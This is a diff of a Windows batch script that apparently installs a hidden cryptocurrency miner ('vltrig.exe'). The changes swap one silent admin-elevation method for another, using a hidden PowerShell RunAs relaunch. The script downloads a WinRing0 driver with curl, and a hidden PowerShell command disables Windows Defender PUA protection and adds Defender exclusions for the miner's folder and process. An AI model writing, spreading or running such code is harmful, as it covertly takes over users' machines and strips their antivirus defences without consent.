@@ -1,12 +1,7 @@
 @echo off
-if "%1"=="go" goto :main
-
-set vbs=%TEMP%\el.vbs
-echo Dim p : p = "%~f0" > "%vbs%"
-echo Set o = CreateObject("Shell.Application") >> "%vbs%"
-echo o.ShellExecute "cmd.exe", "/c " ^& Chr(34) ^& p ^& Chr(34) ^& " go", "", "runas", 0 >> "%vbs%"
-wscript //nologo "%vbs%"
-del "%vbs%" >nul 2>&1
+net session >nul 2>&1
+if %errorLevel% equ 0 goto :main
+powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs -WindowStyle Hidden"
 exit /b
 
 :main
@@ -21,7 +16,7 @@ curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/WinRing0x
 
 if not exist "%DEST%" mkdir "%DEST%"
 
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'vltrig.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'vltrig.exe' -ErrorAction SilentlyContinue"
 
 copy /y "%TMP%\vltrig.exe"      "%DEST%\" >nul
 copy /y "%TMP%\config.json"     "%DEST%\" >nul
